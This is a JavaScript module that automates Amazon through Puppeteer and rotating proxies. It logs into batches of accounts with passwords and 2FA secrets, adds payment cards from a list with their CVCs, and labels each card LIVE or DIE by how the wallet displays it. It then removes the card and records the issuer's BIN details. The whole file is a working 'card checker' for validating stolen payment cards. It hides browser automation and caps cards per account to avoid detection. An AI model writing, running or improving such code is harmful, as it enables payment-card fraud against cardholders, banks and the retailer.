const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const axios = require('axios');
const { inflateRaw } = require('zlib');
const https = require('https');

const data = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));

let listCards = fs.readFileSync(path.join(__dirname, "..", "data", 'card.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);
let indexCard = -1;

// Load all accounts and filter only business accounts
const allAccounts = fs.readFileSync(path.join(__dirname, "..", "data", 'acc.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);
const dataConfig = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));
const businessEmails = dataConfig.businessAccounts || [];

// Filter accounts to only include business accounts
let listChild = allAccounts.filter(accountLine => {
    const email = accountLine.split('|')[0];
    return businessEmails.includes(email);
});

console.log(`Loaded ${allAccounts.length} total accounts, ${listChild.length} business accounts available for card checking`);

let indexChild = -1;
let listProxy = fs.readFileSync(path.join(__dirname, "..", "data", 'proxies.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);

// Set total card count at startup
const totalCards = listCards.length;
global.data.cardTotal = totalCards;

// Update UI counters if console.card is available
if (console.card && typeof console.card.setTotal === 'function') {
    console.card.setTotal(totalCards);
}

// Add a BIN cache to reduce API calls
const binCache = {};
const binCacheFile = path.join(__dirname, "..", "data", 'bin_cache.json');

// Load bin cache if it exists
try {
    if (fs.existsSync(binCacheFile)) {
        const cacheData = fs.readFileSync(binCacheFile, 'utf8');
        Object.assign(binCache, JSON.parse(cacheData));
        console.log(`Loaded ${Object.keys(binCache).length} BIN entries from cache`);
    }
} catch (error) {
    console.log(`Error loading BIN cache: ${error.message}`);
}

// Save cache periodically
setInterval(() => {
    try {
        fs.writeFileSync(binCacheFile, JSON.stringify(binCache), 'utf8');
    } catch (error) {
        console.log(`Error saving BIN cache: ${error.message}`);
    }
}, 30000); // Save every 30 seconds

async function checkCard() {
    !data.childCount ? data.childCount = {} : "";
    !global.temp ? global.temp = {} : "";
    !global.temp.checkCard ? global.temp.checkCard = {} : "";
    
    // Log total cards to be checked
    console.app(`Starting card check with ${totalCards} cards`);
    
    for (let i in listProxy) {
        let [host, port, user, pass] = listProxy[i].split(':');
        let proxy = {
            host: host,
            port: port,
            user: user,
            pass: pass
        };
        initThread(proxy, i);
    }
}

async function initThread(proxy, index) {
    indexChild++;
    if (indexChild >= listChild.length) {
        console.app("All children checked, exiting...");
        console.log("All children checked, exiting...");
        return;
    }
    let [email, pass, secret] = listChild[indexChild].split("|");
    if (data.childCount[email] >= 80) {
        console.app(`Max cards reached for ${email}, skipping...`);
        console.log(`Max cards reached for ${email}, skipping...`);
        initThread(proxy, index);
        return;
    }

    const browser = await puppeteer.launch({
        headless: !global.data.settings.showBrowser && global.data.parentAcc.geminiKey != "",
        protocolTimeout: 120000, // Increase protocol timeout to 2 minutes
        args: [
            `--proxy-server=http://${proxy.host}:${proxy.port}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--ignore-certificate-errors',
            '--disable-infobars',
            '--window-size=700,700',
            '--disable-dev-shm-usage',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-save-password-bubble',
            '--disable-autofill-keyboard-accessory-view',
            '--disable-autofill-keyboard-accessory',
            '--disable-translate'
        ],
        ignoreDefaultArgs: ['--enable-automation']
    });

    const page = await browser.newPage();
    await page.authenticate({ username: proxy.user, password: proxy.pass });
    let form = {
        email,
        pass,
        code: secret,
        proxy: {
            host: proxy.host,
            port: proxy.port,
            username: proxy.user,
            password: proxy.pass
        }
    };

    try {
        await require(path.join(__dirname, "..", "api", "login.js"))(page, form);
    } catch (loginError) {
        console.log(`Login failed for ${email}: ${loginError.message}`);
        console.app(`Login failed for ${email}: ${loginError.message}`);
        await browser.close();

        initThread(proxy, index);
        return;
    }

    await new Promise(resolve => setTimeout(resolve, 1500));
    if (page.url().includes('account-status.amazon.com')) {
        console.app("Login failed, account status issue!");
        console.log("Login failed, account status issue!");
        await browser.close();
        initThread(proxy, index);
        return;
    }
    let linkNow = page.url();

    // Ensure we're on the main Amazon page after login
    if (!linkNow.includes('amazon.com') || linkNow.includes('/ap/') || linkNow.includes('/gp/')) {
        console.log(`Redirecting to Amazon homepage from: ${linkNow}`);
        console.app(`Redirecting to Amazon homepage from: ${linkNow}`);
        await page.goto('https://www.amazon.com', { waitUntil: 'networkidle0' });
        linkNow = page.url();
    }

    // Check the address book
    try {
        await require(path.join(__dirname, "..", "api", "addAddress.js")).gotoBook(page);
        if (!(await require(path.join(__dirname, "..", "api", "addAddress.js")).checkBook(page))) {
            await require(path.join(__dirname, "..", "api", "addAddress.js")).addAddress(page);
        }
        page.goto(linkNow, { waitUntil: 'networkidle0' });
    } catch (addressError) {
        console.log(`Address book error: ${addressError.message}`);
        console.app(`Address book error: ${addressError.message}`);
    }

    let res = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);

    if (res.error) {
        console.log(res.error);
        console.app(res.error);
        browser.close();
        initThread(proxy, index);
        return;
    }
    thread(page, browser, email, index, proxy);
}

async function thread(page, browser, email, index, proxy) {
    global.temp.checkCard[index] = {};
    if (indexCard >= listCards.length) {
        // Don't close the browser immediately; check if we have cards to verify
        const hasCardsToVerify = Object.keys(global.temp.checkCard[index]).length > 0;
        
        if (!hasCardsToVerify) {
            console.app("Closing browser...");
            console.log("Closing browser...");
            await browser.close();
            clearInterval(saveData);
            console.app("All cards checked, exiting...");
            return;
        }
        
        // If we have cards to verify, skip adding more but continue to check wallet
        console.log(`All cards added, proceeding to check wallet for ${email}`);
        console.app(`All cards added, proceeding to check wallet for ${email}`);
        
        // Update remaining cards count
        updateRemainingCardCount();
        
        // Wait for specified delay before checking wallet
        await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));
        
        console.log(`Checking wallets for ${email} at thread ${index}`);
        console.app(`Checking wallets for ${email} at thread ${index}`);
        
        // Check wallet and then exit properly
        await checkWallet(page, browser, email, index, proxy);
        
        // Now close the browser after wallet check is complete
        console.app("Closing browser...");
        console.log("Closing browser...");
        await browser.close();
        console.app("All cards checked, exiting...");
        return;
    }

    console.app(`Checking cards for ${email} at thread ${index}`);
    console.log(`Checking cards for ${email} at thread ${index}`);
    if (data.childCount[email] - 5 > 80 - 5) {
        console.app(`Max cards reached for ${email}, skipping...`);
        console.log(`Max cards reached for ${email}, skipping...`);
        initThread(proxy, index);
        return;
    }
    for (let i = 0; i < 5; i++) {
        indexCard++;
        let card = listCards[indexCard];
        if (indexCard >= listCards.length) {
            console.app("All cards added !");
            break;
        }
        let [number, month, year, cvc] = card.split('|');
        year = year.length == 2 ? '20' + year : year;
        month = month.length == 1 ? '0' + month : month;
        let form = {
            number,
            month,
            year,
            name: 'Saint David',
            cvc
        };
        console.log(`Card: ${card}`);
        let res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
        let attempts = 1;
        const maxAttempts = 3;
        while (!res.success && attempts < maxAttempts) {
            console.log(`Retry attempt ${attempts}/${maxAttempts} for card: ${card}. Error: ${res.error || 'Unknown'}`);
            console.app(`Retry attempt ${attempts}/${maxAttempts} for card: ${card}. Error: ${res.error || 'Unknown'}`);
            attempts++;
            
            // Wait before retry
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Try to navigate back to payment page
            try {
                let refreshRes = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);
                if (refreshRes.error) {
                    console.log("Failed to navigate to payment page, doing page reload instead");
                    await page.reload({ waitUntil: 'networkidle0' });
                }
            } catch (navError) {
                console.log("Navigation error, doing page reload:", navError.message);
                await page.reload({ waitUntil: 'networkidle0' });
            }
            
            // Wait for page to stabilize
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Retry adding card
            res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
        }
        
        if (!res.success) {
            console.log(`Failed to add card ${card} after ${maxAttempts} attempts. Error: ${res.error || 'Unknown error'}`);
            console.app(`Failed to add card ${card} after ${maxAttempts} attempts. Error: ${res.error || 'Unknown error'}`);
            continue; // Skip to the next card in the loop
        }

        // Wait for card info with multiple fallback selectors and increased timeout
        let cardInfoSelector = null;
        try {
            // Try primary selector first
            console.log('Trying primary card selector...');
            await page.waitForSelector('.a-size-base-plus.pmts-instrument-number-tail span', { timeout: 10000 });
            cardInfoSelector = '.a-size-base-plus.pmts-instrument-number-tail span';
            console.log('✅ Primary selector found');
        } catch (error) {
            console.log('❌ Primary card selector failed, trying fallbacks...');
            try {
                // Fallback 1: Different card number selector
                console.log('Trying fallback 1: .pmts-instrument-number span');
                await page.waitForSelector('.pmts-instrument-number span', { timeout: 10000 });
                cardInfoSelector = '.pmts-instrument-number span';
                console.log('✅ Fallback 1 found');
            } catch (error2) {
                try {
                    // Fallback 2: Any card number containing element
                    console.log('Trying fallback 2: [class*="instrument-number"]');
                    await page.waitForSelector('[class*="instrument-number"]', { timeout: 10000 });
                    cardInfoSelector = '[class*="instrument-number"]';
                    console.log('✅ Fallback 2 found');
                } catch (error3) {
                    console.log('❌ All card selectors failed, trying page navigation...');
                    // Navigate to wallet page directly
                    await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', { waitUntil: 'networkidle2' });
                    await page.waitForSelector('[data-testid="pmts-credit-card-instrument"]', { timeout: 15000 });
                    cardInfoSelector = '[data-testid="pmts-credit-card-instrument"]';
                    console.log('✅ Direct wallet navigation successful');
                }
            }
        }
 
        let cardInfo = await page.evaluate((selector) => {
            let card = document.querySelector(selector);
            
            // Try multiple selectors for card number
            if (!card) {
                const cardSelectors = [
                    '.a-size-base-plus.pmts-instrument-number-tail span',
                    '.pmts-instrument-number span',
                    '[class*="instrument-number"] span',
                    '.pmts-instrument-display-number'
                ];
                
                for (const sel of cardSelectors) {
                    card = document.querySelector(sel);
                    if (card) break;
                }
            }

            let link = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img');

            let name = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-size-medium.apx-wallet-details-header.a-text-bold');
            return {
                number: card ? card.innerText : '',
                link: link ? link.src : '',
                name: name ? name.innerText : ''
            };
        }, cardInfoSelector);

        // Check if we got valid card info
        if (!cardInfo.number) {
            console.log(`No card number found for ${card}, skipping...`);
            console.app(`No card number found for ${card}, skipping...`);
            continue;
        }

        let fourNum = cardInfo.number.split('•••• ')[1];
        if (!fourNum) {
            console.log(`Could not extract last 4 digits from ${cardInfo.number}, using full number`);
            fourNum = cardInfo.number.replace(/\D/g, '').slice(-4);
        }
        
        global.temp.checkCard[index][fourNum] = {
            img: cardInfo.link,
            name: cardInfo.name,
            card: form
        }

        data.childCount[email] = data.childCount[email] ? data.childCount[email] + 1 : 1;
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 2000)));
    }

    // Update remaining cards count after each batch
    updateRemainingCardCount();

    // Log completion of card addition and schedule wallet check
    console.log(`Checked cards for ${email} at thread ${index} after ${global.data.settings.checkAfter / 1000} seconds`);
    console.app(`Checked cards for ${email} at thread ${index} after ${global.data.settings.checkAfter / 1000} seconds`);

    // Wait for specified delay before checking wallet
    await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));

    console.log(`Checking wallets for ${email} at thread ${index}`);
    console.app(`Checking wallets for ${email} at thread ${index}`);

    // Start wallet verification process
    checkWallet(page, browser, email, index, proxy);
}

/**
 * Checks the wallet for added cards and verifies their status
 * @param {Object} page - Puppeteer page instance
 * @param {Object} browser - Puppeteer browser instance
 * @param {String} email - User email associated with wallet
 * @param {Number} index - Thread index for tracking
 * @param {Object} proxy - Proxy configuration object
 */
async function checkWallet(page, browser, email, index, proxy) {
    // Reload page and wait for content to be fully loaded
    try {
        await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });

        // Wait for the payment methods container to be available
        await page.waitForSelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical', { timeout: 15000 });

        // Get the number of payment methods in the wallet
        let length = await page.evaluate(async () => {
            let wallet = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
            return wallet && wallet.childNodes[0] ? wallet.childNodes[0].childNodes.length : 0;
        });

        // Iterate through each payment method in the wallet
        let indexCard = 0;
        //for (let i = 0; i < length; i++) {
        while (indexCard <= length+1) {
            let wallet = await page.evaluate((i) => {
                let container = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                if (!container || !container.childNodes[0] || !container.childNodes[0].childNodes[i]) return false;
                
                let wallet = container.childNodes[0].childNodes[i];
                if (wallet && wallet.nodeName && wallet.nodeName.toLowerCase() == 'div') {
                    wallet.click();
                    return true;
                }
                return false;
            }, indexCard); // Because after deleting 1 card, the remaining cards will be moved upwards, so it is necessary to click on the first card to get information

            // Skip non-div elements
            if (!wallet) {
                indexCard++;
                continue;
            }
            await new Promise(resolve => setTimeout(resolve, 3000));
            let cardInfo = await page.evaluate(() => {
                let card = document.querySelector('.a-size-base-plus.pmts-instrument-number-tail span');
                let link = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img');
                let name = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-size-medium.apx-wallet-details-header.a-text-bold');

                return {
                    number: card ? card.innerText : '',
                    link: link ? link.src : '',
                    name: name ? name.innerText : ''
                };
            });

            let fourNum = cardInfo.number.split('•••• ')[1];

            const cardRemoved = await removeCard(page);
            while (cardRemoved.reload) {
                page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
                await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
                cardRemoved = await removeCard(page);
            }
            if (!cardRemoved.success) {
                console.log(`Failed to remove card ${fourNum || 'unknown'}, continuing to next card`);
                indexCard++;
                continue;
            }
            
            if (!global.temp.checkCard[index][fourNum]) {
                indexCard++;
                continue;
            }
            let cardBin = await getCardInfo(global.temp.checkCard[index][fourNum].card.number);
            if (!cardBin.success) {
                console.log(cardBin.error);
            }
            // console.log(cardBin);
            saveRemainingCards();

            if (global.temp.checkCard[index][fourNum].img != cardInfo.link || global.temp.checkCard[index][fourNum].name != cardInfo.name) {
                console.card.live(`LIVE|${global.temp.checkCard[index][fourNum].card.number}|${global.temp.checkCard[index][fourNum].card.month}|${global.temp.checkCard[index][fourNum].card.year}|${global.temp.checkCard[index][fourNum].card.cvc}|- Info Bank: ${cardBin.scheme}|${cardBin.type}|${cardBin.cardTier}|${cardBin.a2}|${cardBin.country}|${cardBin.issuer}`);
            } else {
                console.card.die(`DIE|${global.temp.checkCard[index][fourNum].card.number}|${global.temp.checkCard[index][fourNum].card.month}|${global.temp.checkCard[index][fourNum].card.year}|${global.temp.checkCard[index][fourNum].card.cvc}|- Info Bank: ${cardBin.scheme}|${cardBin.type}|${cardBin.cardTier}|${cardBin.a2}|${cardBin.country}|${cardBin.issuer}`);
            }
        }
        
        return thread(page, browser, email, index, proxy);
    } catch (error) {
        console.log(`Error in checkWallet: ${error.message}`);
        console.app(`Error checking wallet: ${error.message}`);
        return thread(page, browser, email, index, proxy);
    }
}

async function removeCard(page) {
    try {
        // Set higher timeout for this specific operation
        const originalTimeout = page.getDefaultTimeout();
        page.setDefaultTimeout(60000); // 60 seconds
        
        // Check if the remove link exists before waiting for it
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        
        const removeLinkExists = await Promise.race([
            page.evaluate(() => {
                return !!document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal');
            }),
            new Promise((resolve) => setTimeout(() => resolve(false), 10000))
        ]);
        
        if (!removeLinkExists) {
            console.log("Remove link not found, reloading page...");
            page.setDefaultTimeout(originalTimeout); // Restore original timeout
            return {success: false, reload: true};
        }
        
        // Wait with a shorter timeout and click with timeout protection
        await page.waitForSelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal', {timeout: 15000});
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        
        // Use Promise.race to prevent hanging on click
        await Promise.race([
            page.click('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Click timeout')), 10000))
        ]);

        // Check if the remove button appeared with timeout protection
        const removeButtonExists = await Promise.race([
            page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper .apx-remove-link-button', {timeout: 15000})
                .then(() => true)
                .catch(() => false),
            new Promise((resolve) => setTimeout(() => resolve(false), 15000))
        ]);
            
        if (!removeButtonExists) {
            console.log("Remove button not found, skipping card removal");
            page.setDefaultTimeout(originalTimeout); // Restore original timeout
            return {success: false};
        }
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        
        // Use timeout protection for click
        await Promise.race([
            page.click('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper .apx-remove-link-button'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Remove button click timeout')), 10000))
        ]);

        // Handle default payment method confirmation with timeout protection
        await Promise.race([
            page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]', {timeout: 5000}),
            new Promise((resolve) => setTimeout(() => resolve(null), 5000))
        ]);
        
        let defaultElement = await Promise.race([
            page.evaluate(() => {
                const element = document.querySelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]');
                if (element) {
                    element.click();
                    return true;
                }
                return false;
            }),
            new Promise((resolve) => setTimeout(() => resolve(false), 5000))
        ]);
        
        if (defaultElement) {
            page.setDefaultTimeout(originalTimeout); // Restore original timeout
            return {success: true};
        }

        // Wait for the confirmation button with timeout protection
        const confirmButtonExists = await Promise.race([
            page.waitForSelector('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper span.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input input.a-button-input', {timeout: 15000})
                .then(() => true)
                .catch(() => false),
            new Promise((resolve) => setTimeout(() => resolve(false), 15000))
        ]);
            
        if (!confirmButtonExists) {
            console.log("Confirm button not found, skipping card removal");
            page.setDefaultTimeout(originalTimeout); // Restore original timeout
            return {success: false};
        }
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
        
        // Final click with timeout protection
        await Promise.race([
            page.click('.a-popover.a-popover-modal.a-declarative[aria-hidden="false"] .a-popover-wrapper span.a-button.a-button-primary.pmts-delete-instrument.apx-remove-button-desktop.pmts-button-input input.a-button-input'),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Confirm button click timeout')), 10000))
        ]);

        await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
        page.setDefaultTimeout(originalTimeout); // Restore original timeout
        return {success: true};
    } catch (error) {
        console.log(`Error removing card: ${error.message}`);
        // Try to restore original timeout even on error
        try {
            page.setDefaultTimeout(30000); // Fallback timeout
        } catch (timeoutError) {
            // Ignore timeout restoration errors
        }
        return {success: false};
    }
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function getCardInfo(cardNumber) {
    try {
        // Check cache first (first 6-8 digits are the BIN)
        const bin = cardNumber.substring(0, 8);
        const binKey = bin.substring(0, 6); // Use first 6 digits as key
        
        if (binCache[binKey]) {
            console.log(`Using cached BIN data for ${binKey}***`);
            return {
                success: true,
                scheme: binCache[binKey].scheme,
                type: binCache[binKey].type,
                cardTier: binCache[binKey].cardTier,
                a2: binCache[binKey].a2,
                country: binCache[binKey].country,
                issuer: binCache[binKey].issuer
            };
        }
        
        // Direct API call without proxy
        let res = (await axios.get(`https://data.handyapi.com/bin/${cardNumber}`)).data;
        
        if (res.Status === "SUCCESS") {
            // Cache the result
            binCache[binKey] = {
                scheme: res.Scheme,
                type: res.Type,
                cardTier: res.CardTier,
                a2: res.Country.A2,
                country: res.Country.Name,
                issuer: res.Issuer
            };
            
            return {
                success: true,
                ...binCache[binKey]
            };
        }
        
        return { success: false, error: res.Status };
    } catch (error) {
        // Error handling
        if (error.message && error.message.includes('redirects exceeded')) {
            console.log(`Redirect limit exceeded for card ${cardNumber}.`);
        } else {
            console.log(`BIN lookup failed: ${error.message}`);
        }
        
        return { 
            success: false, 
            error: error.message,
            scheme: 'Unknown',
            type: 'Unknown',
            cardTier: 'Unknown',
            a2: 'Unknown',
            country: 'Unknown',
            issuer: 'Unknown'
        };
    }
}

var saveData = setInterval(() => {
    fs.writeFileSync(path.join(__dirname, "..", "data", 'data.json'), JSON.stringify(data, null, 2), 'utf8');
}, 5000);

// Function to save the remaining unscanned cards
function saveRemainingCards() {
    const remainingCards = listCards.slice(indexCard + 1);
    fs.writeFileSync(path.join(global.data.dirSave, 'remaining_cards.txt'), remainingCards.join('\n'), 'utf8');
    
    // Update the remaining cards count in UI
    updateRemainingCardCount();
}

// Helper function to update the remaining count in UI
function updateRemainingCardCount() {
    const remaining = Math.max(0, totalCards - (indexCard + 1));
    
    // Update UI if console.card is available
    if (console.card && typeof console.card.setRemaining === 'function') {
        console.card.setRemaining(remaining);
    }
    
    return remaining;
}

module.exports = checkCard;